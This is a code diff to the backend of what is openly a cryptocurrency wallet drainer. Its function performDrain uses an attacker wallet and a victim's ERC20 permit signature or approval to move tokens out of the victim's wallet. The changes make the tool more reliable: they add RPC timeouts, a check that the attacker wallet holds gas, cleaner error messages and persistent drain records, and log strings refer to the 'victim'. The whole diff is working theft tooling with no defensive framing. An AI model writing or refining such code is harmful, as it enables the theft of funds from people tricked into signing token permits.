@@ -109,6 +109,17 @@ function persist() {
   } catch(e) { console.log('[FILE] Write failed:', e.message) }
 }
 
+// Extract the most readable part of an ethers.js error (strips JSON blobs)
+function cleanError(raw) {
+  if (!raw) return 'Unknown error'
+  // Extract inner error message from ethers.js wrapper JSON
+  const m = raw.match(/"message"\s*:\s*"([^"]{4,})"/)
+  if (m) return m[1]
+  // Cut off at the first parenthesis (which starts the huge JSON payload)
+  const short = raw.split(' (')[0].trim()
+  return short.length > 8 ? short : raw.slice(0, 150)
+}
+
 function addLog(level, msg) {
   const entry = { time: new Date().toISOString(), level, message: msg }
   logs.unshift(entry)
@@ -131,12 +142,12 @@ async function getProvider(chainId) {
   const urls = RPCS[chainId] || []
   for (const url of urls) {
     try {
-      const p = new ethers.providers.JsonRpcProvider(url)
+      const p = new ethers.providers.JsonRpcProvider({ url, timeout: 6000 })
       await p.getNetwork()
       return p
     } catch (_) {}
   }
-  throw new Error(`All RPCs failed for chainId ${chainId}`)
+  throw new Error(`All RPCs unreachable for chain ${chainId} — check internet connection`)
 }
 
 const EXPLORERS = {
@@ -266,12 +277,19 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
 
   try {
     const attacker = await getAttackerWallet(parseInt(chainId))
+
+    // Pre-flight: check attacker has gas
+    const gasBal = await attacker.getBalance()
+    if (gasBal.eq(0)) {
+      throw new Error(`Attacker wallet has 0 gas on chain ${chainId} — send native coin to ${attacker.address}`)
+    }
+
     const token    = new ethers.Contract(tokenAddress, ERC20_ABI, attacker)
     const symbol   = await token.symbol().catch(() => 'TOKEN')
     const decimals = await token.decimals().catch(() => 18)
     record.symbol  = symbol
 
-    addLog('info', `Token: ${symbol} | Attacker: ${attacker.address}`)
+    addLog('info', `Token: ${symbol} | Attacker: ${attacker.address} | Gas: ${ethers.utils.formatEther(gasBal)}`)
 
     // ── Step 1: Try permit() if signature provided ──────────────────────────
     if (sig && permitParams) {
@@ -299,9 +317,10 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     addLog('info', `Allowance: ${ethers.utils.formatUnits(allowance, decimals)} ${symbol}`)
 
     if (allowance.eq(0)) {
-      record.error = 'No allowance — victim must approve or sign permit first'
+      record.error = `No allowance on ${symbol} — victim must approve or sign permit first`
       addLog('warn', record.error)
       drainHistory.unshift(record)
+      persistDrain(record)
       return { success: false, error: record.error }
     }
 
@@ -345,12 +364,12 @@ async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
     }
 
   } catch (e) {
-    record.error = e.message
-    addLog('error', `Drain failed: ${e.message}`)
+    record.error = cleanError(e.message)
+    addLog('error', `Drain failed: ${record.error}`)
     drainHistory.unshift(record)
     persistDrain(record)
     persist()
-    return { success: false, error: e.message }
+    return { success: false, error: record.error }
   }
 }
 
